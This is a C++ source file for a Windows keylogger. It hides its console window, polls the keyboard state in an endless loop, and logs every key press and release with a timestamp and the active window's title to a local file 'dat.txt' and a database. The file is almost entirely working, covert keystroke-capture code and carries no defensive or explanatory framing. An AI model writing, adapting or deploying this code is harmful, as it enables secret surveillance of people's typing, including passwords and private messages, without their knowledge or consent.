#include "keylogger.h"

#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <thread>
#include <chrono>
#include <Psapi.h>
#include <locale>
#include <codecvt>
#pragma comment(lib, "Psapi.lib")

uint64_t timeSinceEpochMillisec() 
{
    using namespace std::chrono;
    return duration_cast<milliseconds>(system_clock::now().time_since_epoch()).count();
}


void GetActiveWindowTitle(std::string& windowTitle) {
    HWND foregroundWindow = GetForegroundWindow();
    if (foregroundWindow == NULL) {
        windowTitle = "No active window";
        return;
    }

    wchar_t titleBuffer[256];
    GetWindowTextW(foregroundWindow, titleBuffer, sizeof(titleBuffer) / sizeof(titleBuffer[0]));

    std::wstring wideString(titleBuffer);
    windowTitle = std::wstring_convert<std::codecvt_utf8<wchar_t>, wchar_t>{}.to_bytes(wideString);
}

void Keylogger::start(Database db)
{
    m_db = db;
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    char KEY = 'x';
    int prevKey = 0;
    int prevKeys[200] = {0};

    while (true) {
        for (int KEY = 8; KEY <= 190; KEY++)
        {
            const SHORT keyState = GetAsyncKeyState(KEY);
            if (keyState == -32767)
            {
                if (prevKeys[KEY] == -32768)
                {
                    continue;
                }
                if (SpecialKeys(KEY) == false)
                {
                    std::string process;
                    GetActiveWindowTitle(process);
                    
                    const uint64_t time = timeSinceEpochMillisec();
                    LOG("pressed");
                    LOG(std::to_string(time));
                    LOG("\n\n");
                    m_db.insertKeyboardKey("keyboard", time, KEY, 0, process);
                }
            }
            else if (prevKeys[KEY] == -32768 && keyState == 0)
            {
                std::string process;
                GetActiveWindowTitle(process);
                const uint64_t time = timeSinceEpochMillisec();
                LOG("released");
                LOG(std::to_string(time));
                LOG("\n\n");
                m_db.insertKeyboardKey("keyboard", time, KEY, 1, process);
            }

            prevKeys[KEY] = keyState;
        }
    }
}

void Keylogger::LOG(std::string input)
{
    std::fstream LogFile;
    LogFile.open("dat.txt", std::fstream::app);
    if (LogFile.is_open()) {
        LogFile << input << " ";
        LogFile.close();
    }
}

bool Keylogger::SpecialKeys(int S_Key) {
    switch (S_Key) {
    case VK_SPACE:
        LOG(" ");
        return true;
    case VK_RETURN:
        LOG("\n");
        return true;
    case '¾':
        LOG(".");
        return true;
    case VK_SHIFT:
        LOG("#SHIFT#");
        return true;
    case VK_BACK:
        LOG("\b");
        return true;
    case VK_RBUTTON:
        LOG("#R_CLICK#");
        return true;
    case VK_CAPITAL:
        LOG("#CAPS_LCOK");
        return true;
    case VK_TAB:
        LOG("#TAB");
        return true;
    case VK_UP:
        LOG("#UP_ARROW_KEY");
        return true;
    case VK_DOWN:
        LOG("#DOWN_ARROW_KEY");
        return true;
    case VK_LEFT:
        LOG("#LEFT_ARROW_KEY");
        return true;
    case VK_RIGHT:
        LOG("#RIGHT_ARROW_KEY");
        return true;
    case VK_CONTROL:
        LOG("#CONTROL");
        return true;
    case VK_MENU:
        LOG("#ALT");
        return true;
    default:
        return false;
    }
}